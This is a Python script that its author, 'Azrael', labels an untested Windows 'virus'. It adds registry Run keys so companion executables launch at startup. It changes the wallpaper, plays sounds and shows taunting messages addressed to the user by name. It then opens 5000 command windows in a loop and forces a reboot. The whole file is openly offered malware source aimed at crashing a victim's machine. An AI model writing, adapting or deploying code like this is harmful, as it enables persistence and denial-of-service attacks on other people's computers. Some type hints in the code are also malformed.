# Python3 programming
# The virus is not tested! :(

import os,platform,sys,socket,ctypes,ipapi,getpass,pyautogui,winreg
from pygame import mixer
from tkinter import *
from tkinter import messagebox
mixer.init()

# If operating system is linux close the virus
if platform.system() == 'Linux':
            sys.exit()

where_i_am,your_name = os.getcwd(),getpass.getuser()


#-------------------------------------#

class main:
    def add_crash_to_startup():

        def create_key(name: str="default", path: ""=str)->bool:
            reg_key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER,r'Software\Microsoft\Windows\CurrentVersion\Run',0,winreg.KEY_WRITE)
            if not reg_key:
                return False

            winreg.SetValueEx(reg_key,name,0,winreg.REG_SZ,path)
            reg_key.Close()
            return True

        create_key('crash', r'{}\programs\crash.exe'.format(where_i_am))
    
    def add_ifbug_to_startup():

        def create_key(name: str="default", path: ""=str)->bool:
            reg_key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER,r'Software\Microsoft\Windows\CurrentVersion\Run',0,winreg.KEY_WRITE)
            if not reg_key:
                return False

            winreg.SetValueEx(reg_key,name,0,winreg.REG_SZ,path)
            reg_key.Close()
            return True

        create_key('ifbug', r'{}\programs\ifbug.exe'.format(where_i_am))

    def main():

        ctypes.windll.user32.SystemParametersInfoW(20,0,r'{}\data\image.jpeg'.format(where_i_am),0)
        mixer.music.load(r'{}\data\music.mp3'.format(where_i_am))
        mixer.music.play()

        window = Tk()
        window.withdraw()

        messagebox.showinfo('Hello','Hello {} :)\nMy name is Azrael!\ni can kill your computer! :)'.format(your_name))

        window.mainloop()

        pyautogui.confirm('Do you want me to free your computer? :/',':)')

        mixer.music.load(r'{}\data\sad.mp3'.format(where_i_am))
        mixer.music.play()
        messagebox.showinfo(':(','Sorry :))))\ni wll crash your computer! :)')

        mixer.music.load(r'{}\data\glitch.mp3'.format(where_i_am))
        for i in range(5000):
            os.system('start')
            mixer.music.play()
        
        os.system('Shutdown -r')

        mixer.quit()
#---------------------------------#

# start virus
if __name__=='__main__':
    try:
        main.add_crash_to_startup()
    except:
        try:
            main.add_ifbug_to_startup()
            os.system('Shutdown -r')
        except: pass
    
    finally:
        main.main()
# coded by Azrael | t.me:@iam_azrael
